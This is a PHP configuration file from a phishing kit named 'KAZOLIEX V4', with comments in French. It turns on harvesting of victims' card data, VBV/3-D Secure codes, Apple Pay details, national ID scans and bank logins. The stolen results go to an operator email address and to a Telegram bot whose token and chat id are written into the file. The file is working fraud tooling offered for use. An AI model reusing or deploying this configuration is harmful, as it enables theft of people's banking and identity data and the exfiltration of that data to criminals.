<?php

/*
   _____ _______________________   _____________
  / ___// ____/_  __/_  __/  _/ | / / ____/ ___/
  \__ \/ __/   / /   / /  / //  |/ / / __ \__ \ 
 ___/ / /___  / /   / / _/ // /|  / /_/ /___/ / 
/____/_____/ /_/   /_/ /___/_/ |_/\____//____/  
                                                KAZOLIEX V4
*/

//===OPTIONS_SUPLEMENTAIRES==//
$inc = "on";
$applepay = "on";
$vbv = "on";
$selfie = "off"; // INDISPONIBLE 
$cni = "on";
$log_bank = "on";
//===OPTIONS_SUPLEMENTAIRES==//    

//===ENVOI_DES_REZS==//   
$boiterez = "kinxsh@protonmail.com";
$spammername = "kinxsh";
$htmlrez = "off";
$ccplusfullinfos = "on"; // SI CETTE OPTION EST ACTIVEE VOUS RECEVEREZ LA CC ET LE FULL INFOS DANS LE MEME REZ

$telegram = "on"; // ENVOYER LES REZ DIRECTEMENT PAR MESSAGE (PLUS RAPIDE, FORTEMENT CONSEILLER SI VOUS UTILISEZ LE VBV)
$bot_token = "2079678648:AAHjGPd8iz6HvteCjpwwXTR7ddpSy6kK7aI";
$chat_id = "kinxsh";
//===ENVOI_DES_REZS==//  





//===OTHERS===//
 //compter le nombre d'etapes
$stepsnumber = 3;

if($applepay == "on")
{
	$stepsnumber = $stepsnumber + 1;
}

if($selfie == "on")
{
	$stepsnumber = $stepsnumber + 1;
}
if($cni == "off")
{
	$stepsnumber = $stepsnumber + 1;
}
if($log_bank == "on")
{
	$stepsnumber = $stepsnumber + 1;
}


?>